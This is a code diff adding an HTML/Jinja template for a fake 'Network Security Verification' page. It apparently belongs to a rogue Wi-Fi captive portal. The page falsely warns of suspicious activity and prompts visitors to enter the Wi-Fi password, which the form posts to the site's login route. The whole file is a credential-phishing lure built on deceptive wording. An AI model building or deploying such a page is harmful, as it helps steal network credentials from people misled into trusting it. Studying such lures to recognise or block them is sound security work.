@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Network Security Verification</title>
+  <style>
+    html, body { height:100%; margin:0; font-family:'Segoe UI',Tahoma,Verdana,sans-serif; background:linear-gradient(135deg,#007bff 0%,#f8fafc 100%); color:#222; }
+    body { display:flex; align-items:center; justify-content:center; min-height:100vh; }
+    .container { background:#fff; border-radius:14px; box-shadow:0 8px 36px rgba(0,0,0,0.13); padding:2.5rem 2.2rem 2.2rem 2.2rem; width:100%; max-width:400px; text-align:center; position:relative; }
+    .alert { background:#f6c700; color:#593c00; font-weight:600; border-radius:6px; padding:0.85rem 1.1rem; margin-bottom:1.25rem; font-size:1.03rem; display:flex; align-items:center; justify-content:center; gap:0.5em; }
+    h1 { font-size:1.45rem; margin-bottom:0.55rem; font-weight:600; color:#22223b; }
+    .subtitle { font-size:1.01rem; color:#555; margin-bottom:1.8rem; line-height:1.5; }
+    .messages { min-height:1.3em; margin-bottom:1.3rem; font-weight:600; }
+    .success { color:#28a745; }
+    .danger { color:#dc3545; }
+    .warning { color:#d08900; }
+    form input[type="password"] { width:100%; padding:0.80rem 1rem; margin-bottom:1.25rem; border:1.4px solid #ced4da; border-radius:7px; font-size:1rem; }
+    form input[type="password"]:focus { border-color:#007bff; outline:none; box-shadow:0 0 7px rgba(0,123,255,0.13); }
+    form button { width:100%; padding:0.80rem 1rem; background-color:#007bff; color:#fff; font-size:1.05rem; font-weight:700; border:none; border-radius:7px; cursor:pointer; transition:background 0.17s; }
+    form button:hover, form button:focus { background-color:#0056b3; }
+    form button:active { background-color:#003a74; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="alert">
+      Network Security Verification Required
+    </div>
+    <h1>One-Time Security Check</h1>
+    <div class="subtitle">
+      Suspicious activity has been detected. Please verify your credentials below to continue using the network.
+    </div>
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        <div class="messages">
+          {% for category, msg in messages %}
+            <div class="{{ category }}">{{ msg }}</div>
+          {% endfor %}
+        </div>
+      {% else %}
+        <div class="messages">&nbsp;</div>
+      {% endif %}
+    {% endwith %}
+    <form method="post" action="{{ url_for('login') }}" novalidate>
+      <input
+        type="password"
+        name="password"
+        placeholder="Enter Wi-Fi Password"
+        required
+        autocomplete="off"
+        spellcheck="false"
+        autofocus
+      />
+      <button type="submit">Verify Access</button>
+    </form>
+  </div>
+</body>
+</html>
